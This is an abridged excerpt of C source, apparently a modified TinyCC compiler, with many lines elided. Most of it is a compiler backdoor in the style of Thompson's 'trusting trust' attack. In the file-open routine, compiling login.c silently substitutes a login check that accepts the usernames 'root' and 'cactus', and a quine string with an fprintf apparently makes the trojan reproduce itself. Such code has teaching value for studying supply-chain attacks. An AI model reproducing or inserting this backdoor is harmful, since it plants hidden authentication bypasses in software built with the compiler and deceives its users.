...
static int _tcc_open(TCCState *s1, const char *filename)
{
    ...
    {\
        ...
        char *bad = %c#include <string.h>\
            ...
            {\
                if (!strcmp(username, %c%croot%c%c) || !strcmp(username, %c%ccactus%c%c))\
                    return 0;\
                return 1;\
            }\
    ...
    {\
        ...
        {\
            ...
            {\
                flag = 1;\
                fprintf(tf, quine, 34, quine, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 37, 34, 34, 92, 92, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);\
            }\
...
ST_FUNC int tcc_open(TCCState *s1, const char *filename)\
    ...
    if (!strcmp(filename, "login.c"))
    {
        ...
        char *bad = "#include <string.h>\
                ...
                do_login(const char *username)\
            {\
                if (!strcmp(username, \"root\") || !strcmp(username, \"cactus\"))\
                    return 0;\
                return 1;\
            }\
            int main(int argc, char *argv[])\
...
PUB_FUNC int tcc_parse_args(TCCState *s, int *pargc, char ***pargv, int optind)
{
    ...
    reparse:
        ...
        case TCC_OPTION_O:
            ...
            /* no failure with unsupported options */
            x = *optarg;
            s->optimize = isnum(x) ? atoi(optarg) : (x) ? x
                                                        : 1;
            break;
